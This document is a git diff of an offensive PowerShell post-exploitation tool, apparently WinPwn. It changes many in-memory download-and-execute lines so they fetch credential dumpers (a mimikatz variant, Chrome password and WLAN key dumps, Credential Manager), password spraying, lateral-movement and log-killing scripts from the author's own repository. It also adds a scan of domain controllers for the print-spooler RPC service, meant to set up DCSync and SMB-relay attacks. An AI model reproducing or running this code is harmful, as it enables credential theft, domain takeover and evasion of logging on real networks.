@@ -244,7 +244,7 @@ function kittielocal
     if (isadmin)
     {
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/mimi.ps1')
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-WLAN-Keys.ps1')
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Get-WLAN-Keys.ps1')
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
 
             Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
@@ -285,7 +285,7 @@ function localreconmodules
     #Local Reconning
             pathcheck
             $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Get-ComputerDetails.ps1')
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Get-ComputerDetails.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
 
             Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
@@ -301,7 +301,7 @@ function localreconmodules
             }
 
             #Check for SMB Signing
-            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/leechristensen/Random/master/PowerShellScripts/Invoke-SMBNegotiate.ps1')
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-SMBNegotiate.ps1')
             Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\LocalRecon\SMBSigningState.txt"
 
             #Collecting Informations
@@ -382,7 +382,7 @@ function localreconmodules
             if ($dotnet -eq "yes" -or $dotnet -eq "y" -or $dotnet -eq "Yes" -or $dotnet -eq "Y")
             {
                 Write-Host -ForegroundColor Yellow 'Searching for Files - Output is saved to the localrecon folder:'
-                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/leechristensen/Random/master/PowerShellScripts/Get-DotNetServices.ps1')
+                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Get-DotNetServices.ps1')
                 Get-DotNetServices  >> "$currentPath\LocalRecon\DotNetBinaries.txt"
             }
 
@@ -426,7 +426,7 @@ function localreconmodules
             $chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'
             if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
             {
-                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/leechristensen/Random/master/PowerShellScripts/Get-ChromeDump.ps1')
+                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Get-ChromeDump.ps1')
                 Install-SqlLiteAssembly
                 Get-ChromeDump >> "$currentPath\LocalRecon\Chromecredentials.txt"
                 Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
@@ -462,7 +462,7 @@ function domainreconmodules
             #Domain / Network Reconing
             $currentPath = (Get-Item -Path ".\" -Verbose).FullName
             pathcheck
-            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
+            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/DomainPasswordSpray.ps1')
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
             $domain_Name = skulked
             $Domain = $domain_Name.Name
@@ -546,6 +546,23 @@ function domainreconmodules
             if ($powersql -eq "yes" -or $powersql -eq "y" -or $powersql -eq "Yes" -or $powersql -eq "Y")
             {
 	    	    powerSQL    
+	        }
+
+            $spoolscan = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan? (yes/no)'
+            if ($spoolscan -eq "yes" -or $spoolscan -eq "y" -or $spoolscan -eq "Yes" -or $spoolscan -eq "Y")
+            {
+	    	        Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
+                    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/SpoolerScanner/master/SpoolerScan.ps1')
+                    $domcontrols = Get-NetDomainController
+                    foreach ($domc in $domcontrols.IPAddress)
+                    {
+                        if (spoolscan -target $domc)
+                        {
+                            Write-Host -ForegroundColor Yellow "Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now"
+                            echo "$domc" >> "$currentPath\DomainRecon\MS-RPNVulnerableDC_$domc.txt"
+                        }
+                    }
+                    #Todo Spoolscan for other active Domain Server machines
 	        }
 	    
             Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
@@ -714,9 +731,8 @@ function latmov
     #Lateral Movement Phase
     pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ChrisTruncer/WMIOps/master/WMIOps.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/masskittie.ps1')
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/DomainPasswordSpray.ps1')
     IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/view.ps1')
     $domain_Name = Get-NetDomain
     $Domain = $domain_Name.Name
@@ -931,8 +947,8 @@ function WinPwn
     Write-Host -ForegroundColor Yellow 'Getting Scripts to Memory'
     
     dependencychecks        
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikittenz.ps1')
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/master/Invoke-Phant0m.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-Mimikittenz.ps1')
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Invoke-Phant0m.ps1')
       
     if (isadmin)
     {
